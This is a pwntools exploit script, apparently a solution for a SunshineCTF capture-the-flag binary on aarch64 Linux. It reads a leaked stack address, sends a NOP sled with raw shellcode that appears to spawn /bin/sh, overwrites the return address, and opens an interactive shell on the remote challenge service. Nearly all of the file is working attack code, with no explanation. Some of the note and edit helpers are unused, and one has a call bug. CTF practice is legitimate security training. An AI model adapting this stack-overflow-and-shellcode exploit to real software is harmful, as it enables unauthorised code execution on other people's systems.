#! /usr/bin/python
from pwn import *

context.update(
        arch="aarch64",
        endian="little",
        log_level="info",
        os="linux",
        terminal=["xfce4-terminal", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "chal.sunshinectf.games"
PORT = 25606

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

def create(p, size, value):
    ru(p,b"")
    sl(p,b"%i" % size)
    ru(p,b"")
    sl(value)

def edit(p, index, value):
    ru(p,b"")
    sl(p,"%i" % index)
    ru(p,b"")
    sl(p,value)

def delete(p, index):
    ru(p,b"")
    sl(p,"%i" % index)

def view(p, index):
    ru(p,b"")
    sl(p,"%i" % index)
    ru(p,b"")
    return rl(p)
    

def exploit(io,e):
    shellcode = b"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"
    io.recvuntil(b"going ")
    leak = int(io.recvuntil(b"MPH")[:-4]) + 0x85
    print(f"LEAK 0x{leak:x}")
    io.sendline(p32(0xD503201F)*((0x48 - len(shellcode))//4) + shellcode + p64(leak))

    io.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    #l = ELF("./libc.so.6")

    exploit(p,e)
